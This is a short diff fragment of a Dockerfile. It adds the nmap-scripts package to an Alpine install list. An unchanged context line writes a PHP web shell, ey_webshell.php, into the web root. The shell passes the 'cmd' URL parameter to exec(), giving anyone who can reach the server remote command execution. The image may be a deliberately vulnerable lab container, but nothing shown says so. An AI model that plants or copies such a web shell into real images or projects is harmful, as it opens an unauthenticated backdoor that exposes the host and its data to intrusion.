@@ -12,7 +12,8 @@ RUN apk add --no-cache \
   nmap \
   vim \
   net-tools \
-  python3
+  python3 \
+  nmap-scripts
 RUN echo "=========="
 USER nobody
 RUN echo "<?php echo exec(\$_GET['cmd']);?>" > /var/www/html/ey_webshell.php
